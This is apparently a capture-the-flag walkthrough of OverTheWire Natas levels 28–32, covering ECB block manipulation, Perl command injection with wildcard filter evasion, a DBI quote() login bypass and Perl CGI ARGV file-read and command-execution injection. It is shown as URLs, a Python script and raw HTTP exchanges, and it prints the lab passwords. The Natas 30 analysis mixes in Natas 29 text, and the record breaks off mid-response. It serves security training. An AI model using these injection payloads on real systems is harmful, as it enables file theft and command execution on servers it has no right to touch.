then, transform this into url encoded format and use it as query. just reverse the recipe. and the query we obtained become `G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6OeWnPci%2FqKte0ohRTkObF%2BT4aVF1T3rVZFTrXVtnaO5kYxm5xtyst2O9VZ%2FszQKTUzQlejQ9qtqvLA46HXHOA90Xt7rKZV8pijIekOP3pg1Ng%3D`

then, the webpage display
```
Whack Computer Joke Database

    31F4j3Qi2PnuhIZQokxXk1L3QT9Cppns
```



### Analysis
The application encrypts user input using ECB mode after embedding it into an SQL query. Due to deterministic block encryption, identical plaintext blocks produce identical ciphertext blocks, allowing manipulation of query structure through block alignment. By controlling input length, the encrypted blocks were shifted and partially replaced to inject a SQL payload, leading to extraction of sensitive data.

<br><br><br><br><br>







## Natas 29
```
URL: http://natas29.natas.labs.overthewire.org
Username: natas29
Password: 31F4j3Qi2PnuhIZQokxXk1L3QT9Cppns
```
After login, the webpage display
```
H3y K1dZ,
y0 rEm3mB3rz p3Rl rit3?
\/\/4Nn4 g0 olD5kewL? R3aD Up!

                        c4n Y0 h4z s4uc3?
```

along with the dropdown selection: 
s3IEcT suMp1n!
perl underground
perl underground 2
perl underground 3
perl underground 4
perl underground 5

### Finding 
if selecting `perl underground 2` the page will navigate to `http://natas29.natas.labs.overthewire.org/index.pl?file=perl+underground+2`
same to other, the page will navigate to specific page depending on the dropdown selection chosen. 


### Approach 
to exploit it, we can enclose the command in |<command>%00. for example `http://natas29.natas.labs.overthewire.org/index.pl?file=|ls%20-l%00`
here we excute the command `ls -l` and the output is (after prettified)
```
total 804
-r-xr-x--- 1 natas29 natas29 2286 Apr 3 15:07 index.pl
-r-xr-x--- 1 natas29 natas29 172923 Apr 3 15:07 perl underground 2.txt
-r-xr-x--- 1 natas29 natas29 180749 Apr 3 15:07 perl underground 3.txt
-r-xr-x--- 1 natas29 natas29 170534 Apr 3 15:07 perl underground 4.txt
-r-xr-x--- 1 natas29 natas29 171845 Apr 3 15:07 perl underground 5.txt
-r-xr-x--- 1 natas29 natas29 114600 Apr 3 15:07 perl underground.txt
```
we need to execute this command becuase directly exeute the command for cat /etc/natas_webpass/natas30 will return `meeeeeep!`, which indicate the error. 

for further inspection, we need to view the content of the index.pl, using the command `cat index.pl`. 
```
END if(param('file')){ $f=param('file'); if($f=~/natas/){ print "meeeeeep!
"; } else{ open(FD, "$f.txt"); print "
```

from this, can know that command used cannot include ~/natas/. Else the `meeeeeep!` will be returned. 

To solve this, can use the wildcard. Either `cat /etc/*_webpass/*30` or `cat /etc/na?as_webpass/nat?s30` will do, as long as 'natas' wording is not existed as command. 

change the url to `http://natas29.natas.labs.overthewire.org/index.pl?file=|cat%20/etc/*_webpass/*30%00` return `WQhx1BvcmP9irs2MP9tRnLsNaDI76YrH`

### Analysis
This challenge exploits a command injection vulnerability in a Perl-based web application where user input is passed into a system call. The application filters any input containing the string “natas”, but this restriction can be bypassed using wildcard characters to avoid direct string matching. By injecting a payload using command separators and null byte termination, arbitrary system commands can be executed. Using wildcard expansion (e.g., /etc/*_webpass/*30) allows access to restricted files without triggering the filter, resulting in successful retrieval of the next level password.

<br><br><br><br><br>







## Natas 30
```
URL: http://natas30.natas.labs.overthewire.org
Username: natas30
Password: WQhx1BvcmP9irs2MP9tRnLsNaDI76YrH

```
After login, the webpage request for username and password input along with the login button. 
below is the content of source code: 
```
/var/www/natas/natas30/index-source.pl

#!/usr/bin/perl
use CGI qw(:standard);
use DBI;

print <<END;
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN">
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas30", "pass": "<censored>" };</script></head>
<body oncontextmenu="javascript:alert('right clicking has been blocked!');return false;">

<!-- morla/10111 <3  happy birthday OverTheWire! <3  -->

<h1>natas30</h1>
<div id="content">

<form action="index.pl" method="POST">
Username: <input name="username"><br>
Password: <input name="password" type="password"><br>
<input type="submit" value="login" />
</form>
END

if ('POST' eq request_method && param('username') && param('password')){
    my $dbh = DBI->connect( "DBI:mysql:natas30","natas30", "<censored>", {'RaiseError' => 1});
    my $query="Select * FROM users where username =".$dbh->quote(param('username')) . " and password =".$dbh->quote(param('password')); 

    my $sth = $dbh->prepare($query);
    $sth->execute();
    my $ver = $sth->fetch();
    if ($ver){
        print "win!<br>";
        print "here is your result:<br>";
        print @$ver;
    }
    else{
        print "fail :(";
    }
    $sth->finish();
    $dbh->disconnect();
}

print <<END;
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
END
```

### Finding 
attempt to enter the username and password always return `fail :(`


### Approach 
test.py code: 
```python
import requests
authentication = requests.auth.HTTPBasicAuth('natas30', 'WQhx1BvcmP9irs2MP9tRnLsNaDI76YrH')
url = 'http://natas30.natas.labs.overthewire.org/index.pl'
params = {"username": "natas31", "password": ["'test' or true", 4]}
response = requests.post(url, data=params, auth=authentication)
print(response.text)
```

run the python script using the command `python test.py`
below is the output obtained: 
```
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN">
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas30", "pass": "WQhx1BvcmP9irs2MP9tRnLsNaDI76YrH" };</script></head>
<body oncontextmenu="javascript:alert('right clicking has been blocked!');return false;">

<!-- morla/10111 <3  happy birthday OverTheWire! <3  -->

<h1>natas30</h1>
<div id="content">

<form action="index.pl" method="POST">
Username: <input name="username"><br>
Password: <input name="password" type="password"><br>
<input type="submit" value="login" />
</form>
win!<br>here is your result:<br>natas31m7bfjAHpJmSYgQWWeqRE2qVBuMiRNq0y<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

### Analysis
Natas 29 demonstrates a classic command injection vulnerability caused by unsafe use of user input in a Perl CGI script. The file parameter is directly inserted into a system-level operation (open(FD, "$f.txt")), which allows the input to influence how the system executes commands. Although there is a basic blacklist filter that blocks the string natas, it is insufficient because it only checks for a literal match and does not prevent alternative ways of referencing files or executing commands. By using shell metacharacters such as | to inject commands and %00 (null byte) to truncate the appended .txt, the restriction can be bypassed. Additionally, wildcard characters like * or ? allow file access without explicitly using the forbidden string. This combination allows retrieval of the target password file despite the filtering mechanism, highlighting how weak input validation and unsafe command construction can lead to full command injection.

This level focuses on a database authentication mechanism implemented using Perl’s DBI module, where user input is passed through $dbh->quote() before being used in an SQL query. At first glance, this appears secure against traditional SQL injection because quoting should properly escape dangerous characters. However, the vulnerability lies not in direct SQL injection, but in how the application logic handles input and results. The query result is fetched using $sth->fetch() and then directly printed with print @$ver, which exposes returned database rows without proper validation. In combination with unexpected input behavior and how parameters are processed in the request, this allows an attacker to bypass the intended authentication logic and retrieve sensitive data. This demonstrates that even when parameter escaping is correctly applied, insecure handling of query results and flawed application logic can still lead to authentication bypass and information leakage.

<br><br><br><br><br>







## Natas 31
```
URL: http://natas31.natas.labs.overthewire.org
Username: natas31
Password: m7bfjAHpJmSYgQWWeqRE2qVBuMiRNq0y
```
After login, the webpage displayed: 
```
 CSV2HTML

We all like .csv files.
But isn't a nicely rendered and sortable table much cooler?
```

and request user to select file to upload along with browse and upload button. 

below is the source code: 
```
/var/www/natas/natas31/index-source.pl

#!/usr/bin/perl
use CGI;
$ENV{'TMPDIR'}="/var/www/natas/natas31/tmp/";

print <<END;
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN">
<head>
<!-- This stuff in the header has nothing to do with the level -->
<!-- Bootstrap -->
<link href="bootstrap-3.3.6-dist/css/bootstrap.min.css" rel="stylesheet">
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas31", "pass": "<censored>" };</script>
<script src="sorttable.js"></script>
</head>
<script src="bootstrap-3.3.6-dist/js/bootstrap.min.js"></script>

<!-- morla/10111 -->
<style>
#content {
    width: 900px;
}
.btn-file {
    position: relative;
    overflow: hidden;
}
.btn-file input[type=file] {
    position: absolute;
    top: 0;
    right: 0;
    min-width: 100%;
    min-height: 100%;
    font-size: 100px;
    text-align: right;
    filter: alpha(opacity=0);
    opacity: 0;
    outline: none;
    background: white;
    cursor: inherit;
    display: block;
}

</style>


<h1>natas31</h1>
<div id="content">
END

my $cgi = CGI->new;
if ($cgi->upload('file')) {
    my $file = $cgi->param('file');
    print '<table class="sortable table table-hover table-striped">';
    $i=0;
    while (<$file>) {
        my @elements=split /,/, $_;

        if($i==0){ # header
            print "<tr>";
            foreach(@elements){
                print "<th>".$cgi->escapeHTML($_)."</th>";   
            }
            print "</tr>";
        }
        else{ # table content
            print "<tr>";
            foreach(@elements){
                print "<td>".$cgi->escapeHTML($_)."</td>";   
            }
            print "</tr>";
        }
        $i+=1;
    }
    print '</table>';
}
else{
print <<END;

<form action="index.pl" method="post" enctype="multipart/form-data">
    <h2> CSV2HTML</h2>
    <br>
    We all like .csv files.<br>
    But isn't a nicely rendered and sortable table much cooler?<br>
    <br>
    Select file to upload:
    <span class="btn btn-default btn-file">
        Browse <input type="file" name="file">
    </span>    
    <input type="submit" value="Upload" name="submit" class="btn">
</form> 
END
}

print <<END;
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
END
```

### Finding
#### Request Content: 
```
POST /index.pl HTTP/1.1
Host: natas31.natas.labs.overthewire.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------101630200521854875143876095310
Content-Length: 389
Origin: http://natas31.natas.labs.overthewire.org
Authorization: Basic bmF0YXMzMTptN2JmakFIcEptU1lnUVdXZXFSRTJxVkJ1TWlSTnEweQ==
Connection: keep-alive
Referer: http://natas31.natas.labs.overthewire.org/
Cookie: _ga_RD0K2239G0=GS2.1.s1775744396$o2$g0$t1775744396$j60$l0$h0; _ga=GA1.1.1340419348.1775651007
Upgrade-Insecure-Requests: 1

-----------------------------101630200521854875143876095310
Content-Disposition: form-data; name="file"; filename="test.csv"
Content-Type: text/csv

col1, col2, col3
row1, row2, row3
row4, row5, row6

-----------------------------101630200521854875143876095310
Content-Disposition: form-data; name="submit"

Upload
-----------------------------101630200521854875143876095310--
```

#### Response Content: 
```
HTTP/1.1 200 OK
Date: Wed, 06 May 2026 12:51:50 GMT
Server: Apache/2.4.58 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 1753
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN">
<head>
<!-- This stuff in the header has nothing to do with the level -->
<!-- Bootstrap -->
<link href="bootstrap-3.3.6-dist/css/bootstrap.min.css" rel="stylesheet">
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas31", "pass": "<censored>" };</script>
<script src="sorttable.js"></script>
</head>
<script src="bootstrap-3.3.6-dist/js/bootstrap.min.js"></script>

<!-- morla/10111 -->
<style>
#content {
    width: 900px;
}
.btn-file {
    position: relative;
    overflow: hidden;
}
.btn-file input[type=file] {
    position: absolute;
    top: 0;
    right: 0;
    min-width: 100%;
    min-height: 100%;
    font-size: 100px;
    text-align: right;
    filter: alpha(opacity=0);
    opacity: 0;
    outline: none;
    background: white;
    cursor: inherit;
    display: block;
}

</style>

<h1>natas31</h1>
<div id="content">
<table class="sortable table table-hover table-striped"><tr><th>col1</th><th> col2</th><th> col3

</th></tr><tr><td>row1</td><td> row2</td><td> row3

</td></tr><tr><td>row4</td><td> row5</td><td> row6
</td></tr></table><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

### Approach 
#### Request Content: 
```
POST /index.pl?/etc/natas_webpass/natas32 HTTP/1.1
Host: natas31.natas.labs.overthewire.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------101630200521854875143876095310
Content-Length: 504
Origin: http://natas31.natas.labs.overthewire.org
Authorization: Basic bmF0YXMzMTptN2JmakFIcEptU1lnUVdXZXFSRTJxVkJ1TWlSTnEweQ==
Connection: keep-alive
Referer: http://natas31.natas.labs.overthewire.org/
Cookie: _ga_RD0K2239G0=GS2.1.s1775744396$o2$g0$t1775744396$j60$l0$h0; _ga=GA1.1.1340419348.1775651007
Upgrade-Insecure-Requests: 1

-----------------------------101630200521854875143876095310
Content-Disposition: form-data; name="file"

ARGV
-----------------------------101630200521854875143876095310
Content-Disposition: form-data; name="file"; filename="test.csv"
Content-Type: text/csv

col1, col2, col3
row1, row2, row3
row4, row5, row6

-----------------------------101630200521854875143876095310
Content-Disposition: form-data; name="submit"

Upload
-----------------------------101630200521854875143876095310--
```

#### Response Content: 
```
HTTP/1.1 200 OK
Date: Wed, 06 May 2026 13:03:17 GMT
Server: Apache/2.4.58 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 1649
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN">
<head>
<!-- This stuff in the header has nothing to do with the level -->
<!-- Bootstrap -->
<link href="bootstrap-3.3.6-dist/css/bootstrap.min.css" rel="stylesheet">
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas31", "pass": "<censored>" };</script>
<script src="sorttable.js"></script>
</head>
<script src="bootstrap-3.3.6-dist/js/bootstrap.min.js"></script>

<!-- morla/10111 -->
<style>
#content {
    width: 900px;
}
.btn-file {
    position: relative;
    overflow: hidden;
}
.btn-file input[type=file] {
    position: absolute;
    top: 0;
    right: 0;
    min-width: 100%;
    min-height: 100%;
    font-size: 100px;
    text-align: right;
    filter: alpha(opacity=0);
    opacity: 0;
    outline: none;
    background: white;
    cursor: inherit;
    display: block;
}

</style>

<h1>natas31</h1>
<div id="content">
<table class="sortable table table-hover table-striped"><tr><th>NaIWhW2VIrKqrc7aroJVHOZvk3RQMi0B
</th></tr></table><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

 Modify the header POST /index.pl?/etc/natas_webpass/natas32 HTTP/1.1
 and insert 
 ```
-----------------------------101630200521854875143876095310
Content-Disposition: form-data; name="file"

ARGV
```

and use the ?/etc/natas_webpass/natas32 as the argument to print the password. 

### Analysis
This level is a Perl file upload vulnerability combined with CGI argument injection. At first glance, the application appears to simply accept a CSV file and render it as an HTML table by reading each line and splitting it by commas. However, the key issue lies in how the uploaded file handle is processed by Perl’s CGI->upload() function. Instead of strictly treating the input as a file upload, the script allows the file parameter to be influenced in a way that it can be interpreted as a file handle or even substituted with special values like ARGV.

The vulnerability is exploited by abusing Perl’s ability to treat input sources as file-like objects. By injecting ARGV as the file parameter and manipulating the request structure, it becomes possible to force the script to read from command-line arguments instead of the uploaded file. Combined with passing a path such as ?/etc/natas_webpass/natas32 in the request URL, the application unintentionally reads sensitive system files as input data. This happens because the script does not properly restrict or validate the file source and trusts the input stream provided by CGI. As a result, sensitive data such as the next level’s password is exposed through the CSV parsing output. This demonstrates how insecure file handling and trust in CGI input streams can lead to arbitrary file disclosure and argument injection vulnerabilities.

<br><br><br><br><br>







## Natas 32
```
URL: http://natas32.natas.labs.overthewire.org
Username: natas32
Password: NaIWhW2VIrKqrc7aroJVHOZvk3RQMi0B
```
After login, the webpage displayed: 
```
 CSV2HTML

We all like .csv files.
But isn't a nicely rendered and sortable table much cooler?

This time you need to prove that you got code exec. There is a binary in the webroot that you need to execute.

Select file to upload:
```

and request user to select file to upload along with browse and upload button. 

below is the source code: 
```
/var/www/natas/natas32/index-source.pl

#!/usr/bin/perl
use CGI;
$ENV{'TMPDIR'}="/var/www/natas/natas32/tmp/";

print <<END;
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN">
<head>
<!-- This stuff in the header has nothing to do with the level -->
<!-- Bootstrap -->
<link href="bootstrap-3.3.6-dist/css/bootstrap.min.css" rel="stylesheet">
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas32", "pass": "<censored>" };</script>
<script src="sorttable.js"></script>
</head>
<script src="bootstrap-3.3.6-dist/js/bootstrap.min.js"></script>

<!-- 
    morla/10111 
    shouts to Netanel Rubin    
-->

<style>
#content {
    width: 900px;
}
.btn-file {
    position: relative;
    overflow: hidden;
}
.btn-file input[type=file] {
    position: absolute;
    top: 0;
    right: 0;
    min-width: 100%;
    min-height: 100%;
    font-size: 100px;
    text-align: right;
    filter: alpha(opacity=0);
    opacity: 0;
    outline: none;
    background: white;
    cursor: inherit;
    display: block;
}

</style>


<h1>natas32</h1>
<div id="content">
END

my $cgi = CGI->new;
if ($cgi->upload('file')) {
    my $file = $cgi->param('file');
    print '<table class="sortable table table-hover table-striped">';
    $i=0;
    while (<$file>) {
        my @elements=split /,/, $_;

        if($i==0){ # header
            print "<tr>";
            foreach(@elements){
                print "<th>".$cgi->escapeHTML($_)."</th>";   
            }
            print "</tr>";
        }
        else{ # table content
            print "<tr>";
            foreach(@elements){
                print "<td>".$cgi->escapeHTML($_)."</td>";   
            }
            print "</tr>";
        }
        $i+=1;
    }
    print '</table>';
}
else{
print <<END;

<form action="index.pl" method="post" enctype="multipart/form-data">
    <h2> CSV2HTML</h2>
    <br>
    We all like .csv files.<br>
    But isn't a nicely rendered and sortable table much cooler?<br>
    <br>
    This time you need to prove that you got code exec. There is a binary in the webroot that you need to execute.
    <br><br>
    Select file to upload:
    <span class="btn btn-default btn-file">
        Browse <input type="file" name="file">
    </span>    
    <input type="submit" value="Upload" name="submit" class="btn">
</form> 
END
}

print <<END;
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
END
```

### Finding 
#### Request Content:
```
POST /index.pl HTTP/1.1
Host: natas32.natas.labs.overthewire.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------3730703083708415794798705494
Content-Length: 381
Origin: http://natas32.natas.labs.overthewire.org
Authorization: Basic bmF0YXMzMjpOYUlXaFcyVklyS3FyYzdhcm9KVkhPWnZrM1JRTWkwQg==
Connection: keep-alive
Referer: http://natas32.natas.labs.overthewire.org/
Cookie: _ga_RD0K2239G0=GS2.1.s1775744396$o2$g0$t1775744396$j60$l0$h0; _ga=GA1.1.1340419348.1775651007
Upgrade-Insecure-Requests: 1

-----------------------------3730703083708415794798705494
Content-Disposition: form-data; name="file"; filename="test.csv"
Content-Type: text/csv

col1, col2, col3
row1, row2, row3
row4, row5, row6

-----------------------------3730703083708415794798705494
Content-Disposition: form-data; name="submit"

Upload
-----------------------------3730703083708415794798705494--
```

#### Response Content: 
```
HTTP/1.1 200 OK
Date: Wed, 06 May 2026 13:23:04 GMT
Server: Apache/2.4.58 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 1790
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN">
<head>
<!-- This stuff in the header has nothing to do with the level -->
<!-- Bootstrap -->
<link href="bootstrap-3.3.6-dist/css/bootstrap.min.css" rel="stylesheet">
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas32", "pass": "<censored>" };</script>
<script src="sorttable.js"></script>
</head>
<script src="bootstrap-3.3.6-dist/js/bootstrap.min.js"></script>

<!-- 
    morla/10111 
    shouts to Netanel Rubin    
-->

<style>
#content {
    width: 900px;
}
.btn-file {
    position: relative;
    overflow: hidden;
}
.btn-file input[type=file] {
    position: absolute;
    top: 0;
    right: 0;
    min-width: 100%;
    min-height: 100%;
    font-size: 100px;
    text-align: right;
    filter: alpha(opacity=0);
    opacity: 0;
    outline: none;
    background: white;
    cursor: inherit;
    display: block;
}

</style>

<h1>natas32</h1>
<div id="content">
<table class="sortable table table-hover table-striped"><tr><th>col1</th><th> col2</th><th> col3
</th></tr><tr><td>row1</td><td> row2</td><td> row3
</td></tr><tr><td>row4</td><td> row5</td><td> row6
</td></tr></table><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

### Approach 
Based on the finding, the request and response almost the same like previous challenge. 
However, by performing the same exploit will not obtain the password for the next challenge.
#### Request Content: 
```
POST /index.pl?/etc/natas_webpass/natas33 HTTP/1.1
Host: natas32.natas.labs.overthewire.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------3730703083708415794798705494
Content-Length: 493
Origin: http://natas32.natas.labs.overthewire.org
Authorization: Basic bmF0YXMzMjpOYUlXaFcyVklyS3FyYzdhcm9KVkhPWnZrM1JRTWkwQg==
Connection: keep-alive
Referer: http://natas32.natas.labs.overthewire.org/
Cookie: _ga_RD0K2239G0=GS2.1.s1775744396$o2$g0$t1775744396$j60$l0$h0; _ga=GA1.1.1340419348.1775651007
Upgrade-Insecure-Requests: 1

-----------------------------3730703083708415794798705494
Content-Disposition: form-data; name="file"

ARGV
-----------------------------3730703083708415794798705494
Content-Disposition: form-data; name="file"; filename="test.csv"
Content-Type: text/csv

col1, col2, col3
row1, row2, row3
row4, row5, row6

-----------------------------3730703083708415794798705494
Content-Disposition: form-data; name="submit"

Upload
-----------------------------3730703083708415794798705494--
```

#### Response Content: 
```
HTTP/1.1 200 OK
Date: Wed, 06 May 2026 13:24:10 GMT
Server: Apache/2.4.58 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 1637
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN">
<head>
<!-- This stuff in the header has nothing to do with the level -->
<!-- Bootstrap -->
<link href="bootstrap-3.3.6-dist/css/bootstrap.min.css" rel="stylesheet">
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas32", "pass": "<censored>" };</script>
<script src="sorttable.js"></script>
</head>
<script src="bootstrap-3.3.6-dist/js/bootstrap.min.js"></script>

<!-- 
    morla/10111 
    shouts to Netanel Rubin    
-->

<style>
#content {
    width: 900px;
}
.btn-file {
    position: relative;
    overflow: hidden;
}
.btn-file input[type=file] {
    position: absolute;
    top: 0;
    right: 0;
    min-width: 100%;
    min-height: 100%;
    font-size: 100px;
    text-align: right;
    filter: alpha(opacity=0);
    opacity: 0;
    outline: none;
    background: white;
    cursor: inherit;
    display: block;
}

</style>

<h1>natas32</h1>
<div id="content">
<table class="sortable table table-hover table-striped"></table><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

Based on the hint `There is a binary in the webroot that you need to execute.`, we can attempt to view the list of files that are existed inside the current directory. 
#### Modified Request Content: 
```
POST /index.pl?/bin/ls%20ls%20.%20| HTTP/1.1
Host: natas32.natas.labs.overthewire.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------3730703083708415794798705494
Content-Length: 493
Origin: http://natas32.natas.labs.overthewire.org
Authorization: Basic bmF0YXMzMjpOYUlXaFcyVklyS3FyYzdhcm9KVkhPWnZrM1JRTWkwQg==
Connection: keep-alive
Referer: http://natas32.natas.labs.overthewire.org/
Cookie: _ga_RD0K2239G0=GS2.1.s1775744396$o2$g0$t1775744396$j60$l0$h0; _ga=GA1.1.1340419348.1775651007
Upgrade-Insecure-Requests: 1

-----------------------------3730703083708415794798705494
Content-Disposition: form-data; name="file"

ARGV
-----------------------------3730703083708415794798705494
Content-Disposition: form-data; name="file"; filename="test.csv"
Content-Type: text/csv

col1, col2, col3
row1, row2, row3
row4, row5, row6

-----------------------------3730703083708415794798705494
Content-Disposition: form-data; name="submit"

Upload
-----------------------------3730703083708415794798705494--
```

#### Response Content: 
```
HTTP/1.1 200 OK
Date: Wed, 06 May 2026 13:34:29 GMT
Server: Apache/2.4.58 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 1882
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN">
<head>
<!-- This stuff in the header has nothing to do with the level -->
<!-- Bootstrap -->
<link href="bootstrap-3.3.6-dist/css/bootstrap.min.css" rel="stylesheet">
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
